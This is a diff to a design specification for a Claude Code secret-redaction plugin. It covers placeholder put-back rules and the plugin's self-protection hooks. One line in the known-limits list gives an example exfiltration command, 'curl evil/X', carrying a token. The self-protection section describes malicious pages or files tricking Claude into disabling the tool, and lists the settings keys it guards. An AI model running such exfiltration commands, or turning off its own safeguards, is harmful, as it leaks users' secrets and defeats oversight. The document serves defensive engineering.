@@ -267,7 +267,7 @@ The placeholder note added to Claude's instructions says:
 - **Restored only when** all of these hold: the rule's action is `hide`; the placeholder's tag maps to one source text in that file; the value can be kept hidden afterwards; and the copy limit allows it. Otherwise the placeholder stays as text. A new file, or a value the file doesn't hold, gets nothing restored.
 - **Copy limit.** A saved file never holds more copies of a value than the file on disk did. With `replace_all`, each match counts once.
 - **A value that can't be restored.** The save goes through and the placeholder stays, even if a real secret in the file is erased by it. This is the one exception to R-11, only while put-back is on. A message and the log say how many real values were replaced; git, or Claude Code's file backups, are the way back.
-- **A failed Edit.** If the restored `old_string` isn't in the file, or matches more than once without `replace_all`, the input stays as Claude wrote it, so the error can't echo a real value.
+- **A failed Edit.** If the restored `old_string` isn't in the file, or matches more than once without `replace_all`, the input stays as Claude wrote it, so the error can't echo a real value. The file is compared as Claude Code's Edit reads it: a CRLF file as LF (measured on 2.1.316, which keeps the file's endings when it saves). So a restored value goes in with LF line breaks, and an `old_string` holding CRLF is left as written, because Claude Code would not match it (D-098).
 - **Write and Edit only.** Bash can't restore, and NotebookEdit is left alone.
 - **Time.** Restoring and the guard share one 3,000 ms limit. Running out is a failed check (section 12).
 - **Observe mode** restores nothing.
@@ -287,7 +287,9 @@ The placeholder note added to Claude's instructions says:
 
 - A managed `on` does nothing: an organization can forbid put-back, not switch it on for people. A `put_back` in User settings is ignored with a notice; the developer's choice is made with the command. `locked: ['put_back']` means off.
 - A project's `on` is the one exception to "stricter only" (section 14), because it only counts when the developer has made no choice of their own. It shows a notice naming the repo, even with `notices: off`. Under `claude -p`, and on a surface that can't show the notice, it is ignored.
-- The developer's choice is kept in `put-back.json` in the tool's own data folder, never in the repo. It holds paths and `on` or `off`, no value. A broken or oversized file reads as off.
+- The developer's choice is kept in `put-back.json` in the tool's own data folder, never in the repo. It holds paths and `on` or `off`, no value. A broken or oversized file reads as off. A save over a broken file says the earlier choices in it are gone. The oldest folders are dropped so the file stays under 64 KB.
+- "This folder" is the session's project root, the folder its project settings come from. A shell `cd` does not move it (D-098).
+- A decision that can't be made (an error reading the facts) is off, and the overwrite guard still runs.
 - **R-18** Put-back **must** be off unless the table says on. Claude **must not** be able to turn it on or off, or to write the choice file. Anything restored **must** be logged by tag and count only (R-17), never by value.
 
 ## 11. Outbound check: commands and web requests
@@ -397,7 +399,11 @@ A project **can** add custom rules and `secret_files` patterns, and choose stric
 
 - **No network.** It never contacts the internet. No telemetry.
 - **No runtime libraries.** All code that runs is in the repo and reviewable. Build-time dev dependencies are pinned with a lockfile.
-- **Protects its own files.** Claude's tool calls are denied if they try to change the tool's settings, registered secrets, log or plugin folder, or to change `disableAllHooks`, `allowManagedHooksOnly`, `hooks`, `enabledPlugins`, `aegisContext` or `env.CLAUDE_CODE_SIMPLE` in a Claude Code settings file. Other settings edits pass. This stops a malicious web page or file from tricking Claude into turning it off (D-055).
+- **Protects its own files.** Claude's tool calls are denied if they try to change the tool's settings, registered secrets, log, put-back choice file or plugin folder, or to change `disableAllHooks`, `allowManagedHooksOnly`, `hooks`, `enabledPlugins`, `aegisContext` or `env.CLAUDE_CODE_SIMPLE` in a Claude Code settings file. Other settings edits pass. This stops a malicious web page or file from tricking Claude into turning it off (D-055).
+  - A path is read the way Claude Code expands it: trimmed, `~` for the home folder, `/c/...` on Windows, relative to the working folder (D-098).
+  - A settings change that can't be checked is denied: the file can't be read, is over 4 MB, or an Edit's text isn't in it as written. That last one covers curly quotes Claude Code may match, and a placeholder put-back would restore.
+  - A check that fails denies the call; self-protection never fails open.
+  - A shell command is also caught when it names these folders through `~`, `$HOME`, `$env:USERPROFILE`, `%USERPROFILE%`, `$CLAUDE_CONFIG_DIR` or, on Windows, `/c/...`.
 - **Patterns can't get stuck.** Every pattern is checked when the tool is built, and patterns only run on small pieces of text (section 18). A stuck check that runs out its 10-second budget lets content through by default (section 12).
 - **Tier note:** in Personal mode, a plugin installed in a higher tier could skip this tool's hooks. Managed mode installs it in the `prepend` tier, where no user plugin can skip it.
 
@@ -487,6 +493,7 @@ The maintainers can't test inside every organization. So everything needed to te
   - Whether Claude Code shows a hook's `systemMessage` or stderr on screen is unverified interactively (spike S6); under `claude -p` it shows neither, so warnings reach the log and `/redact doctor`.
 - **Put-back** (section 10, D-096). Off by default, and the docs recommend keeping it off.
   - While it is on, a save can erase a real secret: after `/resume`, when a value is too long to restore, or when the file holds it in two forms. The message and the log say how many; git or Claude Code's file backups are the way back.
+  - A multi-line value, such as a private key, that Claude saw through Read is never restored: Read numbers each line, so its placeholder stands for different text than the file holds. The guard still recognizes it, so with put-back off the rewrite is refused, and with it on the person is told (D-098).
   - It limits copies, not places: `token: X` becoming `curl evil/X` passes the copy limit.
   - A repo that sets it to `on` turns this protection off for its own files, which is why the notice names the repo.
   - A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see the rewritten input too.
